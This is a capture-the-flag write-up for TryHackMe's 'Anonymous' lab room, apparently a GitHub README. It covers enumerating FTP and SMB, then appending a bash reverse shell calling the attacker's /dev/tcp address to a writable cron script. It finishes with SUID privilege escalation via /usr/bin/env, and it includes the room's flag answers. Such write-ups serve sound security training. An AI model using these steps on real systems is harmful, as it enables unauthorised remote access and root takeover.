![Anonymous Banner](https://i.imgur.com/KHhJB15.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/anonymous_Cover.png" alt="Anonymous">
</p>

# [Anonymous](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/anonymous)

In [this](https://tryhackme.com/room/anonymous) room we use our basic Linux and PrivEsc knowledge to gain access to our machine and get root permissions.

More details [here](https://stawm.design.blog/2020/05/21/anonymous-thm-writeup/).

## Pwn

This guide contains the answer and steps necessary to get to them for the [Anonymous](https://tryhackme.com/room/) room. This room is similar to some other room, but I can't remember the name at the moment.

1. Enumerate the machine.  How many ports are open?

   We first scan the machine for any open ports with the following command:
   
   ```cmd
   nmap -sV 10.10.147.121
   ```
   
   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Nmap_Scan.png)

   ><details><summary>Click for answer</summary>4</details>

2. What service is running on port 21?

   This answer can be found in the previous image.

   ><details><summary>Click for answer</summary>ftp</details>

3. What service is running on ports 139 and 445?

   Both these answers can be seen in the previous image above.

   ><details><summary>Click for answer</summary>smb</details>

4. There's a share on the user's computer.  What's it called?

   We can use smbclient to identify the shares available on the target machine.
   
   ```cmd
   smbclient -NL //10.10.11.32
   ```
   
   ![Smb Shares](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Smb_Shares.png)
      
   To view the contents of this share we can use:
   
   ```cmd
   smbclient -N //10.10.11.32/pics
   ```
   
   ![Smb Share](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Nmap_Smb.png)

   After going through these files, it appears they are just images of some dogs, which have no further use.
   
   ![SMB Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Nmap_Smb_Files.png)
   
   ![Images](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Dogs.png)

   ><details><summary>Click for answer</summary>pics</details>

5. user.txt

   From the nmap scan we found we could connect to the machine through anonymous ftp.
   
   ```cmd
   ftp 10.10.75.132
   ```
   
   ![FTP Log In](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Ftp_Log_In.png)
   
   Looking through the files we see three files in a scripts folder which may be of interest.
   
   ![FTP Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Ftp_Files.png)
   
   We can download them all to our machine to investigate with `mget *`.
   
   ![FTP Download Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Ftp_Download.png)
   
   Looks like the `clean.sh` file is a script that runs periodically to remove some files. This gets stored in the log file. We also note that we have write access to this script. 
   
   ![Removed Files Log](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Removed_Files_Log.png)
   
   Lets find a command for a reverse shell we can add to this files. We can use [pentestmonkeys](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for this.
   
   ![Reverse Shell Command](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Reverse_Shell_Command.png)
   
   We can now append this to the script we downloaded.
   
   ```cmd
   bash -i >& /dev/tcp/10.18.78.136/1337 0>&1
   ```
   
   ![Finished Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Finished_Script.png)
   
   Now all we have to do, is upload the file to the server. Set up a listener and wait for the script to run.
   
   ```cmd
   put clean.sh
   ```
   
   ![FTP Upload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Ftp_Upload.png)
   
   We can check if the command was added using:
   
   ```cmd
   curl ftp://10.10.75.132/scripts/clean.sh
   ```
   
   ![Check Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Check_Script.png)
   
   Now we setup the listener and wait for the incoming connection to be made.
   
   ```cmd
   nc -nlvp 1337
   ```
   
   ![Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Nmap_Reverse_Shell.png)
   
   Now it is time to navigate to the flag and read its contents.
   
   ![User Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Nmap_User.png)

   ><details><summary>Click for answer</summary>90d6f992585815ff991e68748c414740</details>

6. root.txt

   In order for us to gain root on this machine we can look for any binaries which have their SUID bit set. 
   
   ```cmd
   find / -perm -4000 2>/dev/null
   ```
   
   ![Shell SUID](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Shel_SUID.png)
   
   We can use GTFOBins to look for any binaries which don't need sudo or a password. From this list we can use `/usr/bin/env`.
   
   ![GTFO](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_GTFO.png)
   
   Now we can use this command to get root access on the machine.
   
   ```cmd
   /usr/bin/env bin/bash -p
   ```
   
   ![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Root.png)
   
   After a quick check to verify we are indeed root, we can look at the contents of `root.txt`.
   
   ![Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/anonymous/pwn_Root_Flag.png)

   ><details><summary>Click for answer</summary>4d930091c31a622a7ed10f27999af363</details>
